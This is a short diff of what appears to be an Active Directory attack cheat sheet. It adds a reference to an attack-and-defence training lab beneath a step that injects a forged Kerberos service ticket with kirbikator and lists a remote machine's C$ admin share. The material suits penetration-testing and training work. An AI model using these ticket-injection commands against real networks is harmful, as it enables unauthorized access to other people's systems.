@@ -35,3 +35,8 @@ Inject the ST file and access the targeted service with the spoofed rights.
 kirbikator lsa .\ticket.kirbi
 ls \\machine.domain.local\c$
 ```
+
+
+## References
+
+* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
